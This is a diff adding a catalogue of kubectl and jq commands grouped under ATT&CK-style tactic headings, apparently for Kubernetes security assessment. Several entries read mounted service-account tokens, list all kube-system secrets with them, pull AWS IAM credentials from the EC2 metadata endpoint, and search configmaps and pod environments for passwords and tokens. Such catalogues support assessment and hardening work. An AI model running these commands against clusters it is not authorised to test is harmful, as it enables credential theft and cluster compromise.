@@ -1,0 +1,107 @@
+# INITIAL ACCESS
+
+# EXECUTION
+
+# PERSISTENCE
+
+# PRIVILEGE ESCALATION
+
+id: get-privileged-containers
+  description: Get Pods With Privileged Containers
+  command: kubectl get pods --all-namespaces -o json | jq -r '.items[]|select(.spec.containers[].securityContext | select(.privileged == true)).metadata.name'
+
+# DEFENSE EVASION
+
+# CREDENTIAL ACCESS
+
+id: get-sensitive-configmaps-keys
+  description: Get all Configmaps With Sensetive Details In Keys
+  command: kubectl get configmaps --all-namespaces -o json | jq -r '.items[].data | select(. != null)' | awk '{print(tolower($0))}' | jq -r 'with_entries( select(.key|(contains("pass") or contains("secret") or contains("token"))))'
+
+id: get-sensitive-configmaps-values
+  description: Get all configmaps with sensetive details in values
+  command: kubectl get configmaps --all-namespaces -o json | jq -r '.items[].data | select(. != null)' | awk '{print(tolower($0))}' | jq -r 'with_entries( select(.value|(contains("pass") or contains("secret") or contains("token"))))'
+
+id: get-sensitive-containers-env
+  description: Get Containers With Sensetive Details In env
+  command: kubectl get pods --all-namespaces -o json | jq -r '.items[].spec.containers[].env | select(. != null)' | awk '{print(tolower($0))}' | jq -r '.[] | select(.name | (contains("pass") or contains("secret") or contains("token")))'
+
+id: steal-container-mounted-token
+  description: Get the Kubernetes Token Mounted by Default
+  command: TOKEN=$(kubectl exec $POD_NAME -n $NAMESPACE -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+
+id: test-k8s-api-comm
+  description: Test Communication to the Kubernetes API Server
+  command: "kubectl exec $POD_NAME -n $NAMESPACE -- curl https://$API_SERVER/api --header 'Authorization: Bearer $TOKEN' --insecure"
+
+id: list-all-cluster-secrets
+  description: List all Kubernetes Cluster Secrets
+  command: "kubectl exec $POD_NAME -n $NAMESPACE -- curl https://$API_SERVER/api/v1/namespaces/kube-system/secrets --header 'Authorization: Bearer $TOKEN' --insecure"
+
+id: get-ec2-metadata-token
+  description: Get AWS EC2 Instance Metadata Token
+  command: kubectl exec ingress-nginx-controller-df547d78c-rxww2 -n ingress-nginx -- curl http://169.254.169.254/latest/meta-data/iam/security-credentials/nodes.kopstest.k8s.local
+
+# DISCOVERY
+
+id: get-load-balancers
+  description: Get Load Balancers
+  command: kubectl get services --all-namespaces -o jsonpath='{range .items[?(@.spec.type=="LoadBalancer")]}{.status.loadBalancer.ingress[*].hostname}:{.spec.ports[*].port}{"\n"}{end}'
+
+id: get-nodes-external-ip
+  description: Get External IP's of all nodes
+  command: kubectl get nodes --all-namespaces -o jsonpath='{range .items[*].status.addresses[?(@.type=="ExternalIP")]}{.address}{"\n"}{end}'
+
+id: get-k8s-api-config
+  description: Get Kubernetes API Server Config
+  command: POD_NAME=$(kubectl get pods --namespace kube-system | grep kube-apiserver | head -1 | awk '{print $1}') && kubectl describe pod $POD_NAME --namespace kube-system
+
+id: get-k8s-api-args
+  description: Get Kubernetes API Server Container Args
+  command: POD_NAME=$(kubectl get pods --namespace kube-system | grep kube-apiserver | head -1 | awk '{print $1}') && kubectl get pod $POD_NAME --namespace kube-system -o json | jq -r '.spec.containers | .[] |select(.name == "kube-apiserver")| .args'
+
+id: get-net-policy
+  description: Get Network Policies
+  command: kubectl get networkpolicy --all-namespaces
+
+id: get-cluster-admins
+  description: Get Cluster Admin Role Bindings
+  command: kubectl get clusterrolebindings | grep "ClusterRole/cluster-admin"
+
+id: get-wide-secret-access
+  description: Get Cluster Roles With Secrets Access
+  command: kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[].resources | index( "secrets" )|select(. != null)).metadata.name'
+
+id: get-namespaced-secret-access
+  description: Get Roles With Secrets Access
+  command: kubectl get roles --all-namespaces -o json | jq -r '.items[] | select(.rules[].resources | index( "secrets" )|select(. != null)).metadata.name'
+
+id: get-wide-configmaps-access
+  description: Get Cluster Roles with Configmaps Access
+  command: kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[].resources | index( "configmaps" )|select(. != null)).metadata.name'
+
+id: get-namespaced-configmaps-access
+  description: Get Roles with Configmaps Access
+  command: kubectl get roles --all-namespaces -o json | jq -r '.items[] | select(.rules[].resources | index( "configmaps" )|select(. != null)).metadata.name'
+
+id: get-no-limit-containers
+  description: Get Pods With Containers Without Resources Limits
+  command: kubectl get pods --all-namespaces -o json | jq -r '.items[].spec.containers[] | select(.resources.limits == null).name'
+
+id: get-container-images
+  description: Get All Containers Images
+  command: kubectl get pods --all-namespaces -o json | jq -r '.items[].spec.containers[].image' | sort | uniq
+
+# LATERAL MOVEMENT
+
+# COLLECTION
+
+# COMMAND AND CONTROL
+
+id: test-internet-connect
+  description: Get the External IP for Egress Communication to the Internet
+  command: kubectl exec $POD_NAME -n $NAMESPACE -- curl https://ipinfo.io/json
+
+# EXFILTRATION
+
+# IMPACT
